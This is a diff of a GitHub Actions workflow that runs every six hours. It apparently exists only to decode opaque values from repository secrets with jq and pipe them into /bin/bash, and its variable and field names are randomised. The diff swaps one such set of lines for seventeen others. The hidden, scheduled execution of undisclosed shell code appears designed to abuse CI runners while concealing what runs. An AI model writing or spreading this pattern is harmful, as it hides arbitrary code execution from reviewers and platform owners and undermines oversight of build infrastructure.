@@ -1,28 +1,33 @@
 name: duanqirui2603
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '24 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: duanqirui2603
         env:
-          p28: ${{ secrets.p28 }}
+          mlf92254: ${{ secrets.mlf92254 }}
         run: |
-          echo $p28 | jq -r .ioytl53372 | /bin/bash
-          echo $np83 | jq -r .czk549 | /bin/bash
-          echo $duc58459 | jq -r .ifq24 | /bin/bash
-          echo $ss14 | jq -r .o99 | /bin/bash
-          echo $jlt65 | jq -r .mziyz70 | /bin/bash
-          echo $ci64 | jq -r .owxk6588 | /bin/bash
-          echo $bzat7313 | jq -r .m9 | /bin/bash
-          echo $fle05 | jq -r .eivy5 | /bin/bash
-          echo $banj8 | jq -r .qmlee12 | /bin/bash
-          echo $adjn635 | jq -r .ysz47703 | /bin/bash
-          echo $iyl496 | jq -r .jz655 | /bin/bash
-          echo $ht9 | jq -r .iep9 | /bin/bash
+          echo $mlf92254 | jq -r .ky17 | /bin/bash
+          echo $n70610 | jq -r .tavxm23135 | /bin/bash
+          echo $ukgw092 | jq -r .fi0102 | /bin/bash
+          echo $kj873 | jq -r .mlqaj977 | /bin/bash
+          echo $ti7 | jq -r .sukis5 | /bin/bash
+          echo $gnxi8 | jq -r .gzys0 | /bin/bash
+          echo $mfpp6722 | jq -r .dney01271 | /bin/bash
+          echo $ugi961 | jq -r .io7 | /bin/bash
+          echo $ksdks511 | jq -r .z3113 | /bin/bash
+          echo $euvcg614 | jq -r .zg209 | /bin/bash
+          echo $d0720 | jq -r .y9231 | /bin/bash
+          echo $j6 | jq -r .zih4 | /bin/bash
+          echo $kt55570 | jq -r .eo25 | /bin/bash
+          echo $giy3366 | jq -r .ndz18 | /bin/bash
+          echo $qn89 | jq -r .gcqnx832 | /bin/bash
+          echo $f865 | jq -r .yxh50893 | /bin/bash
+          echo $qo56755 | jq -r .k72686 | /bin/bash
 
